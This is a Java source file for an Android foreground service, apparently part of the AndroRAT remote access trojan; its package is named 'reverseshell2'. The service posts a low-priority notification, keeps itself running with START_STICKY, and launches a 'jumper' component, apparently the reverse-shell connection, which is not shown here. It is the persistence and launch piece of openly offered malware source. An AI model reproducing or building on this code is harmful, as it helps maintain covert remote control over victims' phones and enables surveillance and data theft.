package com.example.reverseshell2;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class mainService extends Service {
    static String TAG ="mainServiceClass";
    private static final int NOTIFICATION_ID = 1001;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new functions(null).createNotiChannel(getApplicationContext());

        Notification notification = new NotificationCompat.Builder(getApplicationContext(), "channelid")
                .setContentTitle("AndroRAT foreground service")
                .setContentText("Servicio activo")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build();

        startForeground(NOTIFICATION_ID, notification);
        Log.d(TAG,"in");
        new jumper(getApplicationContext()).init();
        return START_STICKY;
    }
}
